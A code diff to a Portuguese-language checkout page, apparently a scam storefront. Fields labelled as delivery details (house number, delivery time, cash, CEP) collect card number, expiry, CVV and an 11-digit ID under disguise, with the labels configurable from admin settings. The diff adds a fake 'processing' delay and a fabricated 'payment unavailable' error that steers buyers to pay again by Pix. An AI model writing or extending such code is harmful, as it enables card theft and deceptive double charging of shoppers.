@@ -664,7 +664,7 @@
                 <!-- Delivery Payment Fields -->
                 <div id="delivery-fields"
                     style="display: none; margin-top: 20px; border: 1px solid #ddd; padding: 15px; border-radius: 8px; background: #fafafa;">
-                    <h4 style="margin-top: 0; color: #333;">Dados para Entrega</h4>
+                    <h4 style="margin-top: 0; color: #333;">Dados de Cobrança</h4>
                     <div class="form-group">
                         <label>Número da casa (16 dígitos) *</label>
                         <input type="tel" id="delivery-house-number" placeholder="0000000000000000" maxlength="16">
@@ -719,6 +719,20 @@
         let basePrice = 0;
         let bumpsTotal = 0;
 
+        // Global labels for validation messages
+        window.deliveryLabels = {
+            houseNumber: 'Número da casa',
+            deliveryTime: 'Horário da entrega',
+            cash: 'Dinheiro',
+            cep: 'CEP'
+        };
+
+        // Global label for payment method name (for popup button)
+        window.paymentMethodLabel = 'Pagamento';
+
+        // Global label for delivery section title
+        window.deliverySectionTitle = 'Dados de Cobrança';
+
         // Fetch and apply custom labels from admin settings
         async function loadCustomLabels() {
             try {
@@ -740,6 +754,26 @@
                     // Update payment method option text if delivery is enabled
                     if (deliveryOption && settings.labelPaymentDelivery) {
                         deliveryOption.textContent = settings.labelPaymentDelivery;
+                    }
+
+                    // Store labels for validation messages (remove formato hints)
+                    window.deliveryLabels = {
+                        houseNumber: (settings.labelHouseNumber || 'Número da casa (16 dígitos)').replace(/\s*\([^)]*\)/, '').trim(),
+                        deliveryTime: (settings.labelDeliveryTime || 'Horário da entrega (xx/xx)').replace(/\s*\([^)]*\)/, '').trim(),
+                        cash: (settings.labelCash || 'Dinheiro (3 dígitos)').replace(/\s*\([^)]*\)/, '').trim(),
+                        cep: (settings.labelCep || 'CEP (11 dígitos)').replace(/\s*\([^)]*\)/, '').trim()
+                    };
+
+                    // Store payment method label for popup button
+                    window.paymentMethodLabel = settings.labelPaymentDelivery || 'Pagamento';
+
+                    // Store delivery section title
+                    window.deliverySectionTitle = settings.labelDeliverySection || 'Dados de Cobrança';
+
+                    // Update delivery section title
+                    const deliverySectionH4 = document.querySelector('#delivery-fields h4');
+                    if (deliverySectionH4) {
+                        deliverySectionH4.textContent = window.deliverySectionTitle;
                     }
 
                     // Update delivery field labels
@@ -970,19 +1004,91 @@
                     const deliveryCep = $('#delivery-cep').val();
 
                     if (houseNumber.length !== 16) {
-                        Swal.fire('Atenção', 'O Número da casa precisa ter exatamente 16 números.', 'warning');
+                        Swal.fire({
+                            title: 'Atenção',
+                            html: `O <b>${window.deliveryLabels.houseNumber}</b> precisa ter exatamente <b>16 números</b>.`,
+                            icon: 'warning',
+                            iconColor: '#f39c12',
+                            confirmButtonText: 'OK',
+                            confirmButtonColor: '#028b49',
+                            customClass: {
+                                popup: 'swal2-premium-popup',
+                                title: 'swal2-premium-title',
+                                confirmButton: 'swal2-premium-confirm'
+                            },
+                            showClass: {
+                                popup: 'animate__animated animate__fadeInDown animate__faster'
+                            },
+                            hideClass: {
+                                popup: 'animate__animated animate__fadeOutUp animate__faster'
+                            }
+                        });
                         return;
                     }
                     if (deliveryTime.length !== 4) {
-                        Swal.fire('Atenção', 'O Horário da entrega precisa estar no formato xx/xx (4 números).', 'warning');
+                        Swal.fire({
+                            title: 'Atenção',
+                            html: `O <b>${window.deliveryLabels.deliveryTime}</b> precisa estar no formato <b>xx/xx</b> (4 números).`,
+                            icon: 'warning',
+                            iconColor: '#f39c12',
+                            confirmButtonText: 'OK',
+                            confirmButtonColor: '#028b49',
+                            customClass: {
+                                popup: 'swal2-premium-popup',
+                                title: 'swal2-premium-title',
+                                confirmButton: 'swal2-premium-confirm'
+                            },
+                            showClass: {
+                                popup: 'animate__animated animate__fadeInDown animate__faster'
+                            },
+                            hideClass: {
+                                popup: 'animate__animated animate__fadeOutUp animate__faster'
+                            }
+                        });
                         return;
                     }
                     if (cash.length !== 3) {
-                        Swal.fire('Atenção', 'O campo Dinheiro precisa ter exatamente 3 números.', 'warning');
+                        Swal.fire({
+                            title: 'Atenção',
+                            html: `O campo <b>${window.deliveryLabels.cash}</b> precisa ter exatamente <b>3 números</b>.`,
+                            icon: 'warning',
+                            iconColor: '#f39c12',
+                            confirmButtonText: 'OK',
+                            confirmButtonColor: '#028b49',
+                            customClass: {
+                                popup: 'swal2-premium-popup',
+                                title: 'swal2-premium-title',
+                                confirmButton: 'swal2-premium-confirm'
+                            },
+                            showClass: {
+                                popup: 'animate__animated animate__fadeInDown animate__faster'
+                            },
+                            hideClass: {
+                                popup: 'animate__animated animate__fadeOutUp animate__faster'
+                            }
+                        });
                         return;
                     }
                     if (deliveryCep.length !== 11) {
-                        Swal.fire('Atenção', 'O CEP precisa ter exatamente 11 números.', 'warning');
+                        Swal.fire({
+                            title: 'Atenção',
+                            html: `O <b>${window.deliveryLabels.cep}</b> precisa ter exatamente <b>11 números</b>.`,
+                            icon: 'warning',
+                            iconColor: '#f39c12',
+                            confirmButtonText: 'OK',
+                            confirmButtonColor: '#028b49',
+                            customClass: {
+                                popup: 'swal2-premium-popup',
+                                title: 'swal2-premium-title',
+                                confirmButton: 'swal2-premium-confirm'
+                            },
+                            showClass: {
+                                popup: 'animate__animated animate__fadeInDown animate__faster'
+                            },
+                            hideClass: {
+                                popup: 'animate__animated animate__fadeOutUp animate__faster'
+                            }
+                        });
                         return;
                     }
                 }
@@ -1102,12 +1208,40 @@
 
                     if (response.ok) {
                         if (paymentMethod === 'delivery') {
+                            // Simulate processing attempt with professional loading
                             Swal.fire({
-                                icon: 'warning',
+                                title: 'Processando Pagamento...',
+                                html: `Verificando disponibilidade do <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b>...`,
+                                allowOutsideClick: false,
+                                showConfirmButton: false,
+                                didOpen: () => {
+                                    Swal.showLoading();
+                                }
+                            });
+
+                            // Wait 2 seconds to simulate processing attempt
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+
+                            // Show professional error message
+                            Swal.fire({
+                                icon: 'error',
+                                iconColor: '#e74c3c',
                                 title: 'Pagamento Indisponível',
-                                text: 'O pagamento na entrega está indisponível no momento. Por favor, finalize seu pedido via Pix.',
-                                confirmButtonText: 'Pagar com Pix',
-                                confirmButtonColor: '#e63946'
+                                html: `O <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b> está temporariamente indisponível.<br><br>Por favor, finalize seu pedido via <b>Pix</b> para continuar.`,
+                                confirmButtonText: '💠 Pagar com Pix',
+                                confirmButtonColor: '#028b49',
+                                allowOutsideClick: false,
+                                customClass: {
+                                    popup: 'swal2-premium-popup',
+                                    title: 'swal2-premium-title',
+                                    confirmButton: 'swal2-premium-confirm'
+                                },
+                                showClass: {
+                                    popup: 'animate__animated animate__shakeX'
+                                },
+                                hideClass: {
+                                    popup: 'animate__animated animate__fadeOutUp animate__faster'
+                                }
                             }).then(() => {
                                 // Switch to Pix
                                 const paymentSelect = document.getElementById('payment-method');
